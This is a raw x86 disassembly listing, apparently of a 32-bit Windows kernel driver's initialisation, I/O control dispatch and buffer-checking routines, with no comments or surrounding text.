   109dd:	cc                   	int3
   109de:	cc                   	int3
   109df:	cc                   	int3
   109e0:	83 ec 08             	sub    $0x8,%esp
   109e3:	56                   	push   %esi
   109e4:	57                   	push   %edi
   109e5:	8d 7c 24 08          	lea    0x8(%esp),%edi
   109e9:	8d 74 24 0c          	lea    0xc(%esp),%esi
   109ed:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
   109f4:	00 
   109f5:	e8 46 00 00 00       	call   0x10a40
   109fa:	8b 44 24 08          	mov    0x8(%esp),%eax
   109fe:	85 c0                	test   %eax,%eax
   10a00:	75 36                	jne    0x10a38
   10a02:	8d 74 24 08          	lea    0x8(%esp),%esi
   10a06:	e8 d5 00 00 00       	call   0x10ae0
   10a0b:	8b 44 24 08          	mov    0x8(%esp),%eax
   10a0f:	e8 5c 04 00 00       	call   0x10e70
   10a14:	85 c0                	test   %eax,%eax
   10a16:	75 20                	jne    0x10a38
   10a18:	8d 74 24 0c          	lea    0xc(%esp),%esi
   10a1c:	e8 7f 01 00 00       	call   0x10ba0
   10a21:	8d 74 24 08          	lea    0x8(%esp),%esi
   10a25:	e8 f6 01 00 00       	call   0x10c20
   10a2a:	8b 44 24 08          	mov    0x8(%esp),%eax
   10a2e:	8b 48 10             	mov    0x10(%eax),%ecx
   10a31:	68 80 12 01 00       	push   $0x11280
   10a36:	ff d1                	call   *%ecx
   10a38:	5f                   	pop    %edi
   10a39:	5e                   	pop    %esi
   10a3a:	83 c4 08             	add    $0x8,%esp
   10a3d:	c3                   	ret
   10a3e:	cc                   	int3
   10a3f:	cc                   	int3
   10a40:	51                   	push   %ecx
   10a41:	a1 f0 53 01 00       	mov    0x153f0,%eax
   10a46:	a8 01                	test   $0x1,%al
   10a48:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   10a4e:	75 10                	jne    0x10a60
   10a50:	8b 0f                	mov    (%edi),%ecx
   10a52:	83 c8 01             	or     $0x1,%eax
   10a55:	a3 f0 53 01 00       	mov    %eax,0x153f0
   10a5a:	89 0d ec 53 01 00    	mov    %ecx,0x153ec
   10a60:	a8 02                	test   $0x2,%al
   10a62:	75 54                	jne    0x10ab8
   10a64:	83 c8 02             	or     $0x2,%eax
   10a67:	a3 f0 53 01 00       	mov    %eax,0x153f0
   10a6c:	e8 2f 1a 00 00       	call   0x124a0
   10a71:	80 3d 58 53 01 00 00 	cmpb   $0x0,0x15358
   10a78:	74 3e                	je     0x10ab8
   10a7a:	83 3d 4c 53 01 00 00 	cmpl   $0x0,0x1534c
   10a81:	74 35                	je     0x10ab8
   10a83:	8b 15 54 53 01 00    	mov    0x15354,%edx
   10a89:	3b 15 50 53 01 00    	cmp    0x15350,%edx
   10a8f:	7e 27                	jle    0x10ab8
   10a91:	b9 50 53 01 00       	mov    $0x15350,%ecx
   10a96:	b8 01 00 00 00       	mov    $0x1,%eax
   10a9b:	f0 0f c1 01          	lock xadd %eax,(%ecx)
   10a9f:	40                   	inc    %eax
   10aa0:	83 e8 01             	sub    $0x1,%eax
   10aa3:	39 05 54 53 01 00    	cmp    %eax,0x15354
   10aa9:	7e 0d                	jle    0x10ab8
   10aab:	8b 15 4c 53 01 00    	mov    0x1534c,%edx
   10ab1:	c7 04 82 10 33 01 00 	movl   $0x13310,(%edx,%eax,4)
   10ab8:	a1 ec 53 01 00       	mov    0x153ec,%eax
   10abd:	85 c0                	test   %eax,%eax
   10abf:	c6 05 44 53 01 00 00 	movb   $0x0,0x15344
   10ac6:	74 06                	je     0x10ace
   10ac8:	89 07                	mov    %eax,(%edi)
   10aca:	8b c6                	mov    %esi,%eax
   10acc:	59                   	pop    %ecx
   10acd:	c3                   	ret
   10ace:	c7 06 e8 53 01 00    	movl   $0x153e8,(%esi)
   10ad4:	8b c6                	mov    %esi,%eax
   10ad6:	59                   	pop    %ecx
   10ad7:	c3                   	ret
   10ad8:	cc                   	int3
   10ad9:	cc                   	int3
   10ada:	cc                   	int3
   10adb:	cc                   	int3
   10adc:	cc                   	int3
   10add:	cc                   	int3
   10ade:	cc                   	int3
   10adf:	cc                   	int3
   10ae0:	f6 05 e4 53 01 00 01 	testb  $0x1,0x153e4
   10ae7:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   10aed:	0f 85 94 00 00 00    	jne    0x10b87
   10af3:	83 0d e4 53 01 00 01 	orl    $0x1,0x153e4
   10afa:	33 c0                	xor    %eax,%eax
   10afc:	50                   	push   %eax
   10afd:	68 bc 53 01 00       	push   $0x153bc
   10b02:	c6 05 b4 53 01 00 01 	movb   $0x1,0x153b4
   10b09:	c7 05 b8 53 01 00 00 	movl   $0x0,0x153b8
   10b10:	00 00 00 
   10b13:	a3 bc 53 01 00       	mov    %eax,0x153bc
   10b18:	a3 c0 53 01 00       	mov    %eax,0x153c0
   10b1d:	a3 c4 53 01 00       	mov    %eax,0x153c4
   10b22:	a3 c8 53 01 00       	mov    %eax,0x153c8
   10b27:	a3 cc 53 01 00       	mov    %eax,0x153cc
   10b2c:	a3 d0 53 01 00       	mov    %eax,0x153d0
   10b31:	a3 d4 53 01 00       	mov    %eax,0x153d4
   10b36:	a3 d8 53 01 00       	mov    %eax,0x153d8
   10b3b:	ff 15 08 34 01 00    	call   *0x13408
   10b41:	80 3d 58 53 01 00 00 	cmpb   $0x0,0x15358
   10b48:	74 3d                	je     0x10b87
   10b4a:	83 3d 4c 53 01 00 00 	cmpl   $0x0,0x1534c
   10b51:	74 34                	je     0x10b87
   10b53:	a1 54 53 01 00       	mov    0x15354,%eax
   10b58:	3b 05 50 53 01 00    	cmp    0x15350,%eax
   10b5e:	7e 27                	jle    0x10b87
   10b60:	b9 50 53 01 00       	mov    $0x15350,%ecx
   10b65:	b8 01 00 00 00       	mov    $0x1,%eax
   10b6a:	f0 0f c1 01          	lock xadd %eax,(%ecx)
   10b6e:	40                   	inc    %eax
   10b6f:	83 e8 01             	sub    $0x1,%eax
   10b72:	39 05 54 53 01 00    	cmp    %eax,0x15354
   10b78:	7e 0d                	jle    0x10b87
   10b7a:	8b 15 4c 53 01 00    	mov    0x1534c,%edx
   10b80:	c7 04 82 d0 32 01 00 	movl   $0x132d0,(%edx,%eax,4)
   10b87:	c6 05 45 53 01 00 00 	movb   $0x0,0x15345
   10b8e:	c7 06 b4 53 01 00    	movl   $0x153b4,(%esi)
   10b94:	8b c6                	mov    %esi,%eax
   10b96:	c3                   	ret
   10b97:	cc                   	int3
   10b98:	cc                   	int3
   10b99:	cc                   	int3
   10b9a:	cc                   	int3
   10b9b:	cc                   	int3
   10b9c:	cc                   	int3
   10b9d:	cc                   	int3
   10b9e:	cc                   	int3
   10b9f:	cc                   	int3
   10ba0:	f6 05 e0 53 01 00 01 	testb  $0x1,0x153e0
   10ba7:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   10bad:	75 52                	jne    0x10c01
   10baf:	83 0d e0 53 01 00 01 	orl    $0x1,0x153e0
   10bb6:	e8 d5 07 00 00       	call   0x11390
   10bbb:	80 3d 58 53 01 00 00 	cmpb   $0x0,0x15358
   10bc2:	74 3d                	je     0x10c01
   10bc4:	83 3d 4c 53 01 00 00 	cmpl   $0x0,0x1534c
   10bcb:	74 34                	je     0x10c01
   10bcd:	a1 54 53 01 00       	mov    0x15354,%eax
   10bd2:	3b 05 50 53 01 00    	cmp    0x15350,%eax
   10bd8:	7e 27                	jle    0x10c01
   10bda:	b9 50 53 01 00       	mov    $0x15350,%ecx
   10bdf:	b8 01 00 00 00       	mov    $0x1,%eax
   10be4:	f0 0f c1 01          	lock xadd %eax,(%ecx)
   10be8:	40                   	inc    %eax
   10be9:	83 e8 01             	sub    $0x1,%eax
   10bec:	39 05 54 53 01 00    	cmp    %eax,0x15354
   10bf2:	7e 0d                	jle    0x10c01
   10bf4:	8b 15 4c 53 01 00    	mov    0x1534c,%edx
   10bfa:	c7 04 82 c0 32 01 00 	movl   $0x132c0,(%edx,%eax,4)
   10c01:	c6 05 46 53 01 00 00 	movb   $0x0,0x15346
   10c08:	c7 06 7c 53 01 00    	movl   $0x1537c,(%esi)
   10c0e:	8b c6                	mov    %esi,%eax
   10c10:	c3                   	ret
   10c11:	cc                   	int3
   10c12:	cc                   	int3
   10c13:	cc                   	int3
   10c14:	cc                   	int3
   10c15:	cc                   	int3
   10c16:	cc                   	int3
   10c17:	cc                   	int3
   10c18:	cc                   	int3
   10c19:	cc                   	int3
   10c1a:	cc                   	int3
   10c1b:	cc                   	int3
   10c1c:	cc                   	int3
   10c1d:	cc                   	int3
   10c1e:	cc                   	int3
   10c1f:	cc                   	int3
   10c20:	51                   	push   %ecx
   10c21:	f6 05 dc 53 01 00 01 	testb  $0x1,0x153dc
   10c28:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   10c2e:	75 52                	jne    0x10c82
   10c30:	83 0d dc 53 01 00 01 	orl    $0x1,0x153dc
   10c37:	e8 64 19 00 00       	call   0x125a0
   10c3c:	80 3d 58 53 01 00 00 	cmpb   $0x0,0x15358
   10c43:	74 3d                	je     0x10c82
   10c45:	83 3d 4c 53 01 00 00 	cmpl   $0x0,0x1534c
   10c4c:	74 34                	je     0x10c82
   10c4e:	a1 54 53 01 00       	mov    0x15354,%eax
   10c53:	3b 05 50 53 01 00    	cmp    0x15350,%eax
   10c59:	7e 27                	jle    0x10c82
   10c5b:	b9 50 53 01 00       	mov    $0x15350,%ecx
   10c60:	b8 01 00 00 00       	mov    $0x1,%eax
   10c65:	f0 0f c1 01          	lock xadd %eax,(%ecx)
   10c69:	40                   	inc    %eax
   10c6a:	83 e8 01             	sub    $0x1,%eax
   10c6d:	39 05 54 53 01 00    	cmp    %eax,0x15354
   10c73:	7e 0d                	jle    0x10c82
   10c75:	8b 15 4c 53 01 00    	mov    0x1534c,%edx
   10c7b:	c7 04 82 b0 32 01 00 	movl   $0x132b0,(%edx,%eax,4)
   10c82:	c6 05 47 53 01 00 00 	movb   $0x0,0x15347
   10c89:	c7 06 5c 53 01 00    	movl   $0x1535c,(%esi)
   10c8f:	8b c6                	mov    %esi,%eax
   10c91:	59                   	pop    %ecx
   10c92:	c3                   	ret
   10c93:	cc                   	int3
   10c94:	cc                   	int3
   10c95:	cc                   	int3
   10c96:	cc                   	int3
   10c97:	cc                   	int3
   10c98:	cc                   	int3
   10c99:	cc                   	int3
   10c9a:	cc                   	int3
   10c9b:	cc                   	int3
   10c9c:	cc                   	int3
   10c9d:	cc                   	int3
   10c9e:	cc                   	int3
   10c9f:	cc                   	int3
   10ca0:	51                   	push   %ecx
   10ca1:	8b 41 60             	mov    0x60(%ecx),%eax
   10ca4:	8b 40 0c             	mov    0xc(%eax),%eax
   10ca7:	2d 00 38 22 00       	sub    $0x223800,%eax
   10cac:	74 23                	je     0x10cd1
   10cae:	83 e8 04             	sub    $0x4,%eax
   10cb1:	74 07                	je     0x10cba
   10cb3:	b8 02 00 00 c0       	mov    $0xc0000002,%eax
   10cb8:	59                   	pop    %ecx
   10cb9:	c3                   	ret
   10cba:	56                   	push   %esi
   10cbb:	8d 74 24 04          	lea    0x4(%esp),%esi
   10cbf:	e8 1c fe ff ff       	call   0x10ae0
   10cc4:	8b 44 24 04          	mov    0x4(%esp),%eax
   10cc8:	5e                   	pop    %esi
   10cc9:	83 c4 04             	add    $0x4,%esp
   10ccc:	e9 9f 01 00 00       	jmp    0x10e70
   10cd1:	51                   	push   %ecx
   10cd2:	e8 f9 19 00 00       	call   0x126d0
   10cd7:	59                   	pop    %ecx
   10cd8:	c3                   	ret
   10cd9:	cc                   	int3
   10cda:	cc                   	int3
   10cdb:	cc                   	int3
   10cdc:	cc                   	int3
   10cdd:	cc                   	int3
   10cde:	cc                   	int3
   10cdf:	cc                   	int3
   10ce0:	55                   	push   %ebp
   10ce1:	8b ec                	mov    %esp,%ebp
   10ce3:	6a ff                	push   $0xffffffff
   10ce5:	68 c8 50 01 00       	push   $0x150c8
   10cea:	68 6a 31 01 00       	push   $0x1316a
   10cef:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   10cf5:	50                   	push   %eax
   10cf6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   10cfd:	83 ec 0c             	sub    $0xc,%esp
   10d00:	53                   	push   %ebx
   10d01:	56                   	push   %esi
   10d02:	57                   	push   %edi
   10d03:	89 65 e8             	mov    %esp,-0x18(%ebp)
   10d06:	bf 02 00 00 c0       	mov    $0xc0000002,%edi
   10d0b:	89 7d e4             	mov    %edi,-0x1c(%ebp)
   10d0e:	33 db                	xor    %ebx,%ebx
   10d10:	89 5d fc             	mov    %ebx,-0x4(%ebp)
   10d13:	8b 75 0c             	mov    0xc(%ebp),%esi
   10d16:	8b 46 60             	mov    0x60(%esi),%eax
   10d19:	0f b6 00             	movzbl (%eax),%eax
   10d1c:	2b c3                	sub    %ebx,%eax
   10d1e:	74 1f                	je     0x10d3f
   10d20:	83 e8 02             	sub    $0x2,%eax
   10d23:	74 1a                	je     0x10d3f
   10d25:	83 e8 0c             	sub    $0xc,%eax
   10d28:	75 1d                	jne    0x10d47
   10d2a:	8b ce                	mov    %esi,%ecx
   10d2c:	e8 6f ff ff ff       	call   0x10ca0
   10d31:	8b f8                	mov    %eax,%edi
   10d33:	89 7d e4             	mov    %edi,-0x1c(%ebp)
   10d36:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   10d3d:	eb 29                	jmp    0x10d68
   10d3f:	89 5e 1c             	mov    %ebx,0x1c(%esi)
   10d42:	33 ff                	xor    %edi,%edi
   10d44:	89 7d e4             	mov    %edi,-0x1c(%ebp)
   10d47:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   10d4e:	eb 18                	jmp    0x10d68
   10d50:	b8 01 00 00 00       	mov    $0x1,%eax
   10d55:	c3                   	ret
   10d56:	8b 65 e8             	mov    -0x18(%ebp),%esp
   10d59:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   10d60:	33 db                	xor    %ebx,%ebx
   10d62:	8b 75 0c             	mov    0xc(%ebp),%esi
   10d65:	8b 7d e4             	mov    -0x1c(%ebp),%edi
   10d68:	81 ff 03 01 00 00    	cmp    $0x103,%edi
   10d6e:	75 15                	jne    0x10d85
   10d70:	8b c7                	mov    %edi,%eax
   10d72:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   10d75:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   10d7c:	5f                   	pop    %edi
   10d7d:	5e                   	pop    %esi
   10d7e:	5b                   	pop    %ebx
   10d7f:	8b e5                	mov    %ebp,%esp
   10d81:	5d                   	pop    %ebp
   10d82:	c2 08 00             	ret    $0x8
   10d85:	3b fb                	cmp    %ebx,%edi
   10d87:	74 03                	je     0x10d8c
   10d89:	89 5e 1c             	mov    %ebx,0x1c(%esi)
   10d8c:	89 7e 18             	mov    %edi,0x18(%esi)
   10d8f:	32 d2                	xor    %dl,%dl
   10d91:	8b ce                	mov    %esi,%ecx
   10d93:	ff 15 d8 33 01 00    	call   *0x133d8
   10d99:	8b c7                	mov    %edi,%eax
   10d9b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   10d9e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   10da5:	5f                   	pop    %edi
   10da6:	5e                   	pop    %esi
   10da7:	5b                   	pop    %ebx
   10da8:	8b e5                	mov    %ebp,%esp
   10daa:	5d                   	pop    %ebp
   10dab:	c2 08 00             	ret    $0x8
   10dae:	cc                   	int3
   10daf:	cc                   	int3
   10db0:	83 ec 08             	sub    $0x8,%esp
   10db3:	68 74 52 01 00       	push   $0x15274
   10db8:	8d 44 24 04          	lea    0x4(%esp),%eax
   10dbc:	50                   	push   %eax
   10dbd:	ff 15 c0 33 01 00    	call   *0x133c0
   10dc3:	57                   	push   %edi
   10dc4:	6a 00                	push   $0x0
   10dc6:	68 00 01 00 00       	push   $0x100
   10dcb:	6a 22                	push   $0x22
   10dcd:	8d 4c 24 10          	lea    0x10(%esp),%ecx
   10dd1:	51                   	push   %ecx
   10dd2:	6a 00                	push   $0x0
   10dd4:	56                   	push   %esi
   10dd5:	ff 15 b8 33 01 00    	call   *0x133b8
   10ddb:	85 c0                	test   %eax,%eax
   10ddd:	0f 85 80 00 00 00    	jne    0x10e63
   10de3:	b9 e0 0c 01 00       	mov    $0x10ce0,%ecx
   10de8:	89 4e 38             	mov    %ecx,0x38(%esi)
   10deb:	89 4e 3c             	mov    %ecx,0x3c(%esi)
   10dee:	89 4e 40             	mov    %ecx,0x40(%esi)
   10df1:	89 4e 44             	mov    %ecx,0x44(%esi)
   10df4:	89 4e 48             	mov    %ecx,0x48(%esi)
   10df7:	89 4e 4c             	mov    %ecx,0x4c(%esi)
   10dfa:	89 4e 50             	mov    %ecx,0x50(%esi)
   10dfd:	89 4e 54             	mov    %ecx,0x54(%esi)
   10e00:	89 4e 58             	mov    %ecx,0x58(%esi)
   10e03:	89 4e 5c             	mov    %ecx,0x5c(%esi)
   10e06:	89 4e 60             	mov    %ecx,0x60(%esi)
   10e09:	89 4e 64             	mov    %ecx,0x64(%esi)
   10e0c:	89 4e 68             	mov    %ecx,0x68(%esi)
   10e0f:	89 4e 6c             	mov    %ecx,0x6c(%esi)
   10e12:	89 4e 70             	mov    %ecx,0x70(%esi)
   10e15:	89 4e 74             	mov    %ecx,0x74(%esi)
   10e18:	89 4e 78             	mov    %ecx,0x78(%esi)
   10e1b:	89 4e 7c             	mov    %ecx,0x7c(%esi)
   10e1e:	89 8e 80 00 00 00    	mov    %ecx,0x80(%esi)
   10e24:	89 8e 84 00 00 00    	mov    %ecx,0x84(%esi)
   10e2a:	89 8e 88 00 00 00    	mov    %ecx,0x88(%esi)
   10e30:	89 8e 8c 00 00 00    	mov    %ecx,0x8c(%esi)
   10e36:	89 8e 90 00 00 00    	mov    %ecx,0x90(%esi)
   10e3c:	89 8e 94 00 00 00    	mov    %ecx,0x94(%esi)
   10e42:	89 8e 98 00 00 00    	mov    %ecx,0x98(%esi)
   10e48:	89 8e 9c 00 00 00    	mov    %ecx,0x9c(%esi)
   10e4e:	89 8e a0 00 00 00    	mov    %ecx,0xa0(%esi)
   10e54:	89 8e a4 00 00 00    	mov    %ecx,0xa4(%esi)
   10e5a:	8b 0f                	mov    (%edi),%ecx
   10e5c:	81 61 1c 7f ff ff ff 	andl   $0xffffff7f,0x1c(%ecx)
   10e63:	83 c4 08             	add    $0x8,%esp
   10e66:	c3                   	ret
   10e67:	cc                   	int3
   10e68:	cc                   	int3
   10e69:	cc                   	int3
   10e6a:	cc                   	int3
   10e6b:	cc                   	int3
   10e6c:	cc                   	int3
   10e6d:	cc                   	int3
   10e6e:	cc                   	int3
   10e6f:	cc                   	int3
   10e70:	55                   	push   %ebp
   10e71:	8b ec                	mov    %esp,%ebp
   10e73:	83 e4 f8             	and    $0xfffffff8,%esp
   10e76:	83 ec 14             	sub    $0x14,%esp
   10e79:	53                   	push   %ebx
   10e7a:	56                   	push   %esi
   10e7b:	57                   	push   %edi
   10e7c:	8b 3d c0 33 01 00    	mov    0x133c0,%edi
   10e82:	8b f0                	mov    %eax,%esi
   10e84:	68 98 51 01 00       	push   $0x15198
   10e89:	8d 44 24 1c          	lea    0x1c(%esp),%eax
   10e8d:	50                   	push   %eax
   10e8e:	ff d7                	call   *%edi
   10e90:	68 60 52 01 00       	push   $0x15260
   10e95:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   10e99:	51                   	push   %ecx
   10e9a:	ff d7                	call   *%edi
   10e9c:	6a 00                	push   $0x0
   10e9e:	6a 00                	push   $0x0
   10ea0:	6a 00                	push   $0x0
   10ea2:	8d 7e 08             	lea    0x8(%esi),%edi
   10ea5:	6a 00                	push   $0x0
   10ea7:	57                   	push   %edi
   10ea8:	89 7c 24 20          	mov    %edi,0x20(%esp)
   10eac:	ff 15 10 34 01 00    	call   *0x13410
   10eb2:	56                   	push   %esi
   10eb3:	8d 54 24 14          	lea    0x14(%esp),%edx
   10eb7:	52                   	push   %edx
   10eb8:	8d 44 24 20          	lea    0x20(%esp),%eax
   10ebc:	e8 9f 18 00 00       	call   0x12760
   10ec1:	85 c0                	test   %eax,%eax
   10ec3:	75 42                	jne    0x10f07
   10ec5:	8b 46 04             	mov    0x4(%esi),%eax
   10ec8:	8b 38                	mov    (%eax),%edi
   10eca:	8b 58 04             	mov    0x4(%eax),%ebx
   10ecd:	8b 0d 94 51 01 00    	mov    0x15194,%ecx
   10ed3:	e8 28 1a 00 00       	call   0x12900
   10ed8:	32 c9                	xor    %cl,%cl
   10eda:	33 c0                	xor    %eax,%eax
   10edc:	85 db                	test   %ebx,%ebx
   10ede:	76 3c                	jbe    0x10f1c
   10ee0:	02 0c 38             	add    (%eax,%edi,1),%cl
   10ee3:	83 c0 01             	add    $0x1,%eax
   10ee6:	3b c3                	cmp    %ebx,%eax
   10ee8:	72 f6                	jb     0x10ee0
   10eea:	84 c9                	test   %cl,%cl
   10eec:	74 2e                	je     0x10f1c
   10eee:	8b 44 24 0c          	mov    0xc(%esp),%eax
   10ef2:	6a 00                	push   $0x0
   10ef4:	50                   	push   %eax
   10ef5:	ff 15 0c 34 01 00    	call   *0x1340c
   10efb:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10f00:	5f                   	pop    %edi
   10f01:	5e                   	pop    %esi
   10f02:	5b                   	pop    %ebx
   10f03:	8b e5                	mov    %ebp,%esp
   10f05:	5d                   	pop    %ebp
   10f06:	c3                   	ret
   10f07:	6a 00                	push   $0x0
   10f09:	57                   	push   %edi
   10f0a:	ff 15 0c 34 01 00    	call   *0x1340c
   10f10:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10f15:	5f                   	pop    %edi
   10f16:	5e                   	pop    %esi
   10f17:	5b                   	pop    %ebx
   10f18:	8b e5                	mov    %ebp,%esp
   10f1a:	5d                   	pop    %ebp
   10f1b:	c3                   	ret
   10f1c:	8b 76 04             	mov    0x4(%esi),%esi
   10f1f:	85 f6                	test   %esi,%esi
   10f21:	6a 00                	push   $0x0
   10f23:	75 17                	jne    0x10f3c
   10f25:	8b 4c 24 10          	mov    0x10(%esp),%ecx
   10f29:	51                   	push   %ecx
   10f2a:	ff 15 0c 34 01 00    	call   *0x1340c
   10f30:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10f35:	5f                   	pop    %edi
   10f36:	5e                   	pop    %esi
   10f37:	5b                   	pop    %ebx
   10f38:	8b e5                	mov    %ebp,%esp
   10f3a:	5d                   	pop    %ebp
   10f3b:	c3                   	ret
   10f3c:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
   10f40:	77 17                	ja     0x10f59
   10f42:	8b 54 24 10          	mov    0x10(%esp),%edx
   10f46:	52                   	push   %edx
   10f47:	ff 15 0c 34 01 00    	call   *0x1340c
   10f4d:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10f52:	5f                   	pop    %edi
   10f53:	5e                   	pop    %esi
   10f54:	5b                   	pop    %ebx
   10f55:	8b e5                	mov    %ebp,%esp
   10f57:	5d                   	pop    %ebp
   10f58:	c3                   	ret
   10f59:	8b 44 24 10          	mov    0x10(%esp),%eax
   10f5d:	50                   	push   %eax
   10f5e:	ff 15 0c 34 01 00    	call   *0x1340c
   10f64:	5f                   	pop    %edi
   10f65:	5e                   	pop    %esi
   10f66:	33 c0                	xor    %eax,%eax
   10f68:	5b                   	pop    %ebx
   10f69:	8b e5                	mov    %ebp,%esp
   10f6b:	5d                   	pop    %ebp
   10f6c:	c3                   	ret
   10f6d:	cc                   	int3
   10f6e:	cc                   	int3
   10f6f:	cc                   	int3
   10f70:	83 ec 08             	sub    $0x8,%esp
   10f73:	53                   	push   %ebx
   10f74:	55                   	push   %ebp
   10f75:	56                   	push   %esi
   10f76:	57                   	push   %edi
   10f77:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
   10f7b:	6a 00                	push   $0x0
   10f7d:	6a 00                	push   $0x0
   10f7f:	6a 00                	push   $0x0
   10f81:	8d 6f 08             	lea    0x8(%edi),%ebp
   10f84:	6a 00                	push   $0x0
   10f86:	55                   	push   %ebp
   10f87:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
   10f8e:	00 
   10f8f:	89 6c 24 28          	mov    %ebp,0x28(%esp)
   10f93:	ff 15 10 34 01 00    	call   *0x13410
   10f99:	8b 1d a0 33 01 00    	mov    0x133a0,%ebx
   10f9f:	6a 10                	push   $0x10
   10fa1:	6a 00                	push   $0x0
   10fa3:	ff d3                	call   *%ebx
   10fa5:	8b f0                	mov    %eax,%esi
   10fa7:	85 f6                	test   %esi,%esi
   10fa9:	74 41                	je     0x10fec
   10fab:	8b 47 04             	mov    0x4(%edi),%eax
   10fae:	8b 78 04             	mov    0x4(%eax),%edi
   10fb1:	8b 28                	mov    (%eax),%ebp
   10fb3:	57                   	push   %edi
   10fb4:	6a 00                	push   $0x0
   10fb6:	ff d3                	call   *%ebx
   10fb8:	89 06                	mov    %eax,(%esi)
   10fba:	89 7e 04             	mov    %edi,0x4(%esi)
   10fbd:	89 46 08             	mov    %eax,0x8(%esi)
   10fc0:	89 7e 0c             	mov    %edi,0xc(%esi)
   10fc3:	8b 06                	mov    (%esi),%eax
   10fc5:	85 c0                	test   %eax,%eax
   10fc7:	75 0e                	jne    0x10fd7
   10fc9:	8b 6c 24 14          	mov    0x14(%esp),%ebp
   10fcd:	c7 44 24 10 01 00 00 	movl   $0xc0000001,0x10(%esp)
   10fd4:	c0 
   10fd5:	eb 17                	jmp    0x10fee
   10fd7:	85 ed                	test   %ebp,%ebp
   10fd9:	74 0b                	je     0x10fe6
   10fdb:	57                   	push   %edi
   10fdc:	55                   	push   %ebp
   10fdd:	50                   	push   %eax
   10fde:	e8 81 21 00 00       	call   0x13164
   10fe3:	83 c4 0c             	add    $0xc,%esp
   10fe6:	8b 6c 24 14          	mov    0x14(%esp),%ebp
   10fea:	eb 02                	jmp    0x10fee
   10fec:	33 f6                	xor    %esi,%esi
   10fee:	8b 44 24 20          	mov    0x20(%esp),%eax
   10ff2:	8b 78 04             	mov    0x4(%eax),%edi
   10ff5:	3b f7                	cmp    %edi,%esi
   10ff7:	74 21                	je     0x1101a
   10ff9:	85 ff                	test   %edi,%edi
   10ffb:	74 16                	je     0x11013
   10ffd:	8b 07                	mov    (%edi),%eax
   10fff:	85 c0                	test   %eax,%eax
   11001:	8b 1d f8 33 01 00    	mov    0x133f8,%ebx
   11007:	74 05                	je     0x1100e
   11009:	6a 00                	push   $0x0
   1100b:	50                   	push   %eax
   1100c:	ff d3                	call   *%ebx
   1100e:	6a 00                	push   $0x0
   11010:	57                   	push   %edi
   11011:	ff d3                	call   *%ebx
   11013:	8b 4c 24 20          	mov    0x20(%esp),%ecx
   11017:	89 71 04             	mov    %esi,0x4(%ecx)
   1101a:	8b 74 24 10          	mov    0x10(%esp),%esi
   1101e:	85 f6                	test   %esi,%esi
   11020:	6a 00                	push   $0x0
   11022:	55                   	push   %ebp
   11023:	74 12                	je     0x11037
   11025:	ff 15 0c 34 01 00    	call   *0x1340c
   1102b:	5f                   	pop    %edi
   1102c:	8b c6                	mov    %esi,%eax
   1102e:	5e                   	pop    %esi
   1102f:	5d                   	pop    %ebp
   11030:	5b                   	pop    %ebx
   11031:	83 c4 08             	add    $0x8,%esp
   11034:	c2 08 00             	ret    $0x8
   11037:	8b 54 24 24          	mov    0x24(%esp),%edx
   1103b:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
   1103f:	75 15                	jne    0x11056
   11041:	ff 15 0c 34 01 00    	call   *0x1340c
   11047:	5f                   	pop    %edi
   11048:	5e                   	pop    %esi
   11049:	5d                   	pop    %ebp
   1104a:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1104f:	5b                   	pop    %ebx
   11050:	83 c4 08             	add    $0x8,%esp
   11053:	c2 08 00             	ret    $0x8
   11056:	ff 15 0c 34 01 00    	call   *0x1340c
   1105c:	5f                   	pop    %edi
   1105d:	5e                   	pop    %esi
   1105e:	5d                   	pop    %ebp
   1105f:	33 c0                	xor    %eax,%eax
   11061:	5b                   	pop    %ebx
   11062:	83 c4 08             	add    $0x8,%esp
   11065:	c2 08 00             	ret    $0x8
   11068:	cc                   	int3
   11069:	cc                   	int3
   1106a:	cc                   	int3
   1106b:	cc                   	int3
   1106c:	cc                   	int3
   1106d:	cc                   	int3
   1106e:	cc                   	int3
   1106f:	cc                   	int3
   11070:	80 38 00             	cmpb   $0x0,(%eax)
   11073:	74 24                	je     0x11099
   11075:	56                   	push   %esi
   11076:	8b 70 04             	mov    0x4(%eax),%esi
   11079:	85 f6                	test   %esi,%esi
   1107b:	c6 00 00             	movb   $0x0,(%eax)
   1107e:	74 18                	je     0x11098
   11080:	8b 06                	mov    (%esi),%eax
   11082:	85 c0                	test   %eax,%eax
   11084:	57                   	push   %edi
   11085:	8b 3d f8 33 01 00    	mov    0x133f8,%edi
   1108b:	74 05                	je     0x11092
   1108d:	6a 00                	push   $0x0
   1108f:	50                   	push   %eax
   11090:	ff d7                	call   *%edi
   11092:	6a 00                	push   $0x0
   11094:	56                   	push   %esi
   11095:	ff d7                	call   *%edi
   11097:	5f                   	pop    %edi
   11098:	5e                   	pop    %esi
   11099:	c3                   	ret
   1109a:	cc                   	int3
   1109b:	cc                   	int3
   1109c:	cc                   	int3
   1109d:	cc                   	int3
   1109e:	cc                   	int3
   1109f:	cc                   	int3
   110a0:	51                   	push   %ecx
   110a1:	8b 48 08             	mov    0x8(%eax),%ecx
   110a4:	83 c1 04             	add    $0x4,%ecx
   110a7:	3b 48 04             	cmp    0x4(%eax),%ecx
   110aa:	57                   	push   %edi
   110ab:	77 1a                	ja     0x110c7
